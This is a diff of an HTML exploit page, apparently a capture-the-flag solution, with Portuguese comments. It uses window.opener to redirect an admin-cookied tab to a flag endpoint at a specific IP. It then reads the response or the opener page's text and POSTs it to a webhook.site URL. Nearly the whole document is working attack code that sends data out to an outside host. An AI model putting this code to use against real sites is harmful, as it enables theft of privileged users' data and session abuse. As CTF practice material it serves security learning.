@@ -1,28 +1,31 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Redirecting Admin...</title>
+    <title>Flag stealer</title>
   </head>
   <body>
-    <h1>Sending the flag...</h1>
     <script>
       if (window.opener) {
-        // Redireciona a aba principal (com cookie de admin) para /get_flag
+        // Redireciona a aba principal (com admin cookie)
         window.opener.location = "http://34.134.162.213:17001/get_flag";
 
-        // Após 1.5 segundos, esta aba também tenta pegar a flag
+        // Espera a aba carregar e tenta ler o conteúdo da flag de lá
         setTimeout(() => {
-          fetch("http://34.134.162.213:17001/get_flag")
-            .then(response => response.text())
-            .then(flag => {
-              // Envia a flag para seu webhook
-              fetch("https://webhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad", {
-                method: "POST",
-                mode: "no-cors",
-                body: flag
-              });
+          try {
+            const flagText = window.opener.document.body.innerText;
+            fetch("https://webhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad", {
+              method: "POST",
+              mode: "no-cors",
+              body: flagText
             });
-        }, 1500);
+          } catch (e) {
+            fetch("https://webhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad", {
+              method: "POST",
+              mode: "no-cors",
+              body: "erro: " + e
+            });
+          }
+        }, 2000);
       }
     </script>
   </body>
